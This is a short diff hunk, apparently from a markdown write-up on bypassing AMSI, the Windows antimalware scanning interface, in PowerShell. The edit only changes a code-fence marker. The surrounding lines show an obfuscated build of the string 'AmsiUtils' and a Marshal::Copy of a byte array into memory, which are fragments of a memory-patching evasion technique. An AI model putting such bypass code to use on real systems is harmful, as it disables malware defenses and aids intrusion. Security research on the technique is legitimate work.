@@ -141,7 +141,7 @@ egex]::Unescape('\u0041')+'msiUtils')
 echo $ptr
 # copy the array to the memory location
 [System.Runtime.InteropServices.Marshal]::Copy($sec565,0,$ptr,$length)
-```bash
+```
 ```bash
 AMSI Bypass Code
 We create the byte array, and will find the length for our call to copy later on.
